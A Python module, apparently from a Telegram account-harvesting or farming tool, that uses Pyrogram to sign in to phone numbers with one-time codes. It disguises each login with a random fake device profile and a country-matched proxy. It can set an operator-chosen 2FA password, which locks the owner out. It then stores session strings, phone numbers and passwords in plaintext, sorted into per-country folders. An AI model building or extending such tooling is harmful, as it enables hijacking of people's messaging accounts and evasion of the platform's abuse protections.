import os
import asyncio
from pyrogram import Client
from pyrogram.errors import SessionPasswordNeeded, PhoneCodeInvalid
from config_engine import ConfigEngine

class TelegramEngine:
    def __init__(self, config: ConfigEngine, storage_dir="database_sessions"):
        self.config = config
        self.storage_dir = storage_dir
        if not os.path.exists(self.storage_dir):
            os.makedirs(self.storage_dir)

    async def send_otp(self, phone_number: str):
        device = self.config.get_random_device()
        proxy = self.config.get_country_proxy(phone_number)
        session_name = f"temp_{phone_number.replace('+', '')}"
        
        client = Client(
            name=session_name,
            api_id=self.config.api_id,
            api_hash=self.config.api_hash,
            device_model=device["device_model"],
            system_version=device["system_version"],
            app_version=device["app_version"],
            lang_code=device["lang_code"],
            proxy=proxy,
            in_memory=True
        )
        
        await client.connect()
        sent_code = await client.send_code(phone_number)
        
        return {
            "client": client,
            "phone_hash": sent_code.phone_code_hash,
            "session_name": session_name
        }

    async def complete_login(self, client: Client, phone_number: str, phone_hash: str, otp_code: str):
        try:
            await client.sign_in(phone_number, phone_hash, otp_code)
        except SessionPasswordNeeded:
            return {"status": "error", "message": "Account already has 2FA enabled!"}
        except PhoneCodeInvalid:
            return {"status": "error", "message": "Invalid OTP Code!"}

        # 2FA Management Check
        applied_2fa = "Disabled"
        if self.config.use_2fa:
            applied_2fa = self.config.custom_2fa_password
            try:
                await client.enable_cloud_password(applied_2fa)
            except Exception as e:
                print(f"2FA Setup Note: {e}")

        # Local DB Saving with Country Folder Separation
        country_code = self.config.get_country_info(phone_number) or "UNKNOWN"
        country_dir = os.path.join(self.storage_dir, country_code)
        if not os.path.exists(country_dir):
            os.makedirs(country_dir)

        clean_phone = phone_number.replace("+", "").strip()
        save_path = os.path.join(country_dir, f"{clean_phone}.session")
        
        session_string = await client.export_session_string()
        await client.disconnect()

        # Metadata save
        info_path = os.path.join(country_dir, f"{clean_phone}_info.txt")
        with open(info_path, "w", encoding="utf-8") as f:
            f.write(f"Phone: {phone_number}\nCountry: {country_code}\n2FA: {applied_2fa}\nSession String: {session_string}\n")

        # Save Persistent File
        persistent_client = Client(
            name=save_path.replace(".session", ""),
            api_id=self.config.api_id,
            api_hash=self.config.api_hash,
            session_string=session_string
        )
        await persistent_client.connect()
        await persistent_client.disconnect()

        return {"status": "success", "country": country_code}
